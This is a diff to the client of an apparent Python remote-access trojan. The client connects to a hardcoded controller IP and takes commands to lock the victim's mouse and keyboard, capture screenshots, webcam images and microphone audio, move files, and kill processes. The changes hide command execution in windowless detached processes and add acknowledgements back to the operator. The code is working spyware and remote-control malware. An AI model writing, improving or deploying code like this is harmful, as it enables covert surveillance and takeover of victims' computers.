@@ -20,6 +20,7 @@ from pynput.keyboard import Key, Controller
 from pynput import keyboard
 from mss import mss
 import numpy as np
+import psutil
 from filetarget import download_file, upload_file
 
 ip = '192.168.18.198'
@@ -45,17 +46,23 @@ def lock_cursor():
 
             while is_locked_cursor:
                 pyautogui.moveTo(x, y)
-                time.sleep(0.001)
+                time.sleep(0.005)
         time.sleep(0.1)
 
 def lock_keyboard():
     global is_locked_keyboard
+    block_keyboard = None
 
     while True:
-        if is_locked_keyboard:
+        if is_locked_keyboard and block_keyboard is None:
             block_keyboard = keyboard.Listener(suppress=True)
-
             block_keyboard.start()
+
+        elif not is_locked_keyboard and block_keyboard is not None:
+            block_keyboard.stop()
+            block_keyboard = None
+
+        time.sleep(0.1)
 
 def thread_lock_cursor():
     lcu = threading.Thread(target=lock_cursor, daemon=True)
@@ -83,30 +90,37 @@ def move_cursor(sok):
         data = data.strip()
 
         if data == "invalid":
+            sok.sendall(b"[-] Invalid value")
             return
 
         if data == "rclick":
             pyautogui.rightClick()
+            sok.sendall(b"[+] Done")
             return
         
         elif data == "lclick":
             pyautogui.leftClick()
+            sok.sendall(b"[+] Done")
             return
         
         elif data == "unlock cursor":
             is_locked_cursor = False
+            sok.sendall(b"[+] Cursor is unlocked")
             return
             
         elif data == "lock cursor":
             is_locked_cursor = True
+            sok.sendall(b"[+] Cursor is locked")
             return
 
         elif data == "unlock keyboard":
             is_locked_keyboard = False
+            sok.sendall(b"[+] Keyboard is unlocked")
             return
 
         elif data == "lock keyboard":
             is_locked_keyboard = True
+            sok.sendall(b"[+] Keyboard is locked")
             return
             
         if "," not in data:
@@ -117,6 +131,7 @@ def move_cursor(sok):
             x = int(data[0])
             y = int(data[1])
             pyautogui.move(x, y)
+            sok.sendall(f"[+] Moved cursor by {x}, {y}".encode())
     except:
         return
     finally:
@@ -153,24 +168,50 @@ def screen_shot(sok):
     upload_file(sok,'ss.png')
     os.remove("ss.png")
 
-def execute(cmd):
-    if shutil.which(cmd):
-        os.system(f"start {cmd}")
-    else:
-        pass
+def execute(sok, cmd):
+    DETACHED_PROCESS = 0x00000008
+    CREATE_NEW_PROCESS_GROUP = 0x00000200
+    CREATE_NO_WINDOW = 0x08000000
 
-def kill(cmd):
-    if shutil.which(cmd):
-        os.system(f"taskkill /IM {cmd} /F")
-    else:
-        pass
-
-def pidkill(cmd):
+    flag = DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW
+    
     try:
-        os.system(f"taskkill /PID {cmd} /F")
-    except:
-        return
+        cmd = cmd.strip()
+        if not cmd:
+            sok.sendall(b"[-] Wrong value\n")
+            return
+        subprocess.Popen(cmd, creationflags=flag, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
 
+        sok.sendall(b"[+] Process created\n")
+    except Exception as e:
+        sok.sendall(f"[-] Error: {e}\n".encode())
+    return
+    
+def kill(sok, cmd):
+    found = False
+    for proc in psutil.process_iter(['pid', 'name']):
+        try:
+            if proc.info['name'].lower() in cmd:
+                proc.kill()
+                found = True
+        except (psutil.ZombieProcess, psutil.AccessDenied, psutil.NoSuchProcess, Exception):
+            continue
+    if not found:
+        sok.sendall(b"[-] No such process found\n")
+    else:
+        sok.sendall(b"[+] Process killed\n")
+    return
+    
+def pidkill(sok, cmd):
+    try:
+        cmd = int(cmd)
+        proc = psutil.Process(cmd)
+        proc.kill()
+        sok.sendall(b"[+] Process killed\n")
+    except (psutil.ZombieProcess, psutil.AccessDenied, psutil.NoSuchProcess, ValueError, Exception):
+        sok.sendall(b"[-] No such process found\n")
+    return
+    
 def send_camera_image(ip, port=9999):
     cap = cv2.VideoCapture(0)
     ret, frame = cap.read()
@@ -224,7 +265,6 @@ def record_n_send():
                         rate=RATE, input=True,
                         frames_per_buffer=CHUNK)
     print('Recording')
-    frame = []
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((ip, 9996))
@@ -395,11 +435,11 @@ def jalankan_perintah(sok):
         elif perintah == 'snap_cam':
             send_camera_image(ip=ip, port=9993)
         elif perintah[:7] == 'execute':
-            execute(perintah[8:])
+            execute(sok, perintah[8:])
         elif perintah[:4] == 'kill':
-            kill(perintah[5:])
+            kill(sok, perintah[5:])
         elif perintah[:7] == 'pidkill':
-            pidkill(perintah[8:])
+            pidkill(sok, perintah[8:])
         elif perintah.startswith("move"):
             move_cursor(sok)
         elif perintah == "rclick":
